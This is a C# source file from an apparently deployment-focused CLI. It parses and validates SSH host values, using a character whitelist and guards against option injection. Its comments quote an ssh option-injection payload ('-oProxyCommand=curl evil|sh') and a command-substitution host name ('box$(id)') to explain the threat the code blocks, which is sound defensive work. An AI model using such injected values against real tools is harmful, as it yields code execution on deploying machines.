using System.Globalization;

namespace Rask.Cli;

/// <summary>
/// An SSH destination as the user wrote it on <c>--host</c>: <c>box</c>, <c>user@box</c>,
/// <c>user@box:2222</c>, an IPv6 literal, or a bare <c>~/.ssh/config</c> alias.
///
/// <para>Deploys address the host as <c>docker -H ssh://user@box:2222</c>, which carries the port
/// inline. Host setup can't go through docker (installing docker over <c>docker -H ssh://</c> is
/// chicken-and-egg), so it shells out to the real <c>ssh</c> CLI — and that takes the port as a
/// separate <c>-p</c> flag. Splitting the target is what lets both speak to the same box.</para>
/// </summary>
internal readonly record struct SshTarget(string? User, string Host, int? Port)
{
    /// <summary>
    /// Parse a <c>--host</c> value, rejecting anything that isn't safely an SSH destination.
    ///
    /// <para><strong>This is a security boundary, not tidiness.</strong> The destination becomes an
    /// argument to the real <c>ssh</c> binary, and ssh has no way to know a value came from data
    /// rather than the command line: a "host" of <c>-oProxyCommand=curl evil|sh</c> is parsed as an
    /// <em>option</em> and runs that command on the machine invoking rask. Since the host is
    /// remembered in <c>.rask/deploy.json</c> — committed, and read by CI — a hostile value there
    /// would otherwise be code execution on any machine that deploys the repo.</para>
    /// </summary>
    public static bool TryParse(string value, out SshTarget target, out string? error)
    {
        target = default;
        error = null;

        var text = value.Trim();
        if (text.Length == 0)
        {
            error = "An SSH host can't be empty.";
            return false;
        }

        target = ParseCore(text);

        // A leading '-' makes ssh read the destination as an option. Nothing else is needed to
        // execute arbitrary code, so this is rejected outright rather than escaped.
        if (target.Host.StartsWith('-') || target.User?.StartsWith('-') == true)
        {
            error = $"'{value}' isn't a valid SSH host — it would be read as an ssh option, not a destination.";
            return false;
        }

        if (target.Host.Length == 0)
        {
            error = $"'{value}' isn't a valid SSH host — there's no host name in it.";
            return false;
        }

        // A whitelist, not a blocklist. Beyond ssh's own argv, this value is printed into shell commands
        // we tell the user to paste (the `ssh-keyscan` line from --github-actions), so a name like
        // `box$(id)` — no spaces, no leading dash — would otherwise survive and then run on paste.
        // Hostnames are RFC-1123 plus the brackets/colons of an IPv6 literal; ssh-config aliases in
        // practice stay inside the same set.
        if (!IsSafe(target.Host) || (target.User is not null && !IsSafe(target.User)))
        {
            error = $"'{value}' isn't a valid SSH host — host and user names may only contain letters, digits, '.', '-', '_' (and '[', ']', ':' for an IPv6 address).";
            return false;
        }

        return true;

        static bool IsSafe(string part) => part.All(c =>
            char.IsAsciiLetterOrDigit(c) || c is '.' or '-' or '_' or '[' or ']' or ':');
    }

    /// <summary>
    /// Parse a value already known to be well-formed. Throws on anything <see cref="TryParse"/>
    /// rejects — callers taking user input must use <see cref="TryParse"/> and report the error.
    /// </summary>
    public static SshTarget Parse(string value) =>
        TryParse(value, out var target, out var error) ? target : throw new ArgumentException(error, nameof(value));

    /// <summary>
    /// Split the destination. The user part is split at the last <c>@</c>; a trailing <c>:port</c>
    /// only counts when it's numeric and the host isn't an unbracketed IPv6 literal (<c>::1</c> is an
    /// address, not <c>:</c> + a port).
    /// </summary>
    private static SshTarget ParseCore(string text)
    {
        // Tolerate the URL form docker itself uses, so --host ssh://user@box round-trips.
        if (text.StartsWith("ssh://", StringComparison.OrdinalIgnoreCase))
        {
            text = text["ssh://".Length..];
        }

        string? user = null;
        var at = text.LastIndexOf('@');
        if (at >= 0)
        {
            user = text[..at];
            text = text[(at + 1)..];
        }

        return TrySplitPort(text, out var host, out var port)
            ? new SshTarget(Empty(user), host, port)
            : new SshTarget(Empty(user), text, null);

        static string? Empty(string? value) => string.IsNullOrEmpty(value) ? null : value;
    }

    /// <summary>The <c>[user@]host</c> ssh addresses this box by — never carries the port.</summary>
    public string Destination => User is null ? Host : $"{User}@{Host}";

    /// <summary>The bare <c>[user@]host[:port]</c> form stored in <c>.rask/deploy.json</c> and handed to <c>docker -H ssh://</c>.</summary>
    public override string ToString() =>
        Port is null ? Destination : $"{Destination}:{Port.Value.ToString(CultureInfo.InvariantCulture)}";

    /// <summary>The same box addressed as a different login — used once the deploy user replaces root.</summary>
    public SshTarget WithUser(string user) => this with { User = user };

    /// <summary>
    /// The <c>ssh</c> flags that address this target non-interactively, ending with the destination so
    /// callers can append a remote command. <c>BatchMode=yes</c> makes a box that wants a password fail
    /// fast instead of hanging on a prompt no one can answer.
    /// </summary>
    /// <param name="freshConnection">
    /// Force a brand-new connection (<c>ControlPath=none</c>). Verification after a risky change MUST
    /// set this: a multiplexed ControlMaster session would happily reuse the already-open channel and
    /// prove nothing about whether the new credentials actually work.
    /// </param>
    public IReadOnlyList<string> ConnectionArguments(bool freshConnection = false)
    {
        var args = new List<string> { "-o", "BatchMode=yes", "-o", "ConnectTimeout=10" };
        if (freshConnection)
        {
            args.AddRange(["-o", "ControlPath=none"]);
        }

        if (Port is not null)
        {
            args.AddRange(["-p", Port.Value.ToString(CultureInfo.InvariantCulture)]);
        }

        // Belt and braces with TryParse's leading-dash check: `--` stops ssh reading the destination
        // as an option even if a value ever reaches here without going through validation.
        args.Add("--");
        args.Add(Destination);
        return args;
    }

    // "box:2222" → ("box", 2222). Bracketed IPv6 keeps its brackets for ssh ("[::1]:22" → "[::1]").
    private static bool TrySplitPort(string text, out string host, out int port)
    {
        host = text;
        port = 0;

        var colon = text.LastIndexOf(':');
        if (colon < 0)
        {
            return false;
        }

        // An unbracketed IPv6 literal ("::1", "fe80::1") has several colons and no port.
        if (!text.StartsWith('[') && text.IndexOf(':', StringComparison.Ordinal) != colon)
        {
            return false;
        }

        // "[::1]" — brackets with no trailing :port.
        if (colon < text.LastIndexOf(']'))
        {
            return false;
        }

        var tail = text[(colon + 1)..];
        if (!int.TryParse(tail, NumberStyles.None, CultureInfo.InvariantCulture, out var parsed) || parsed is < 1 or > 65535)
        {
            return false;
        }

        host = text[..colon];
        port = parsed;
        return true;
    }
}
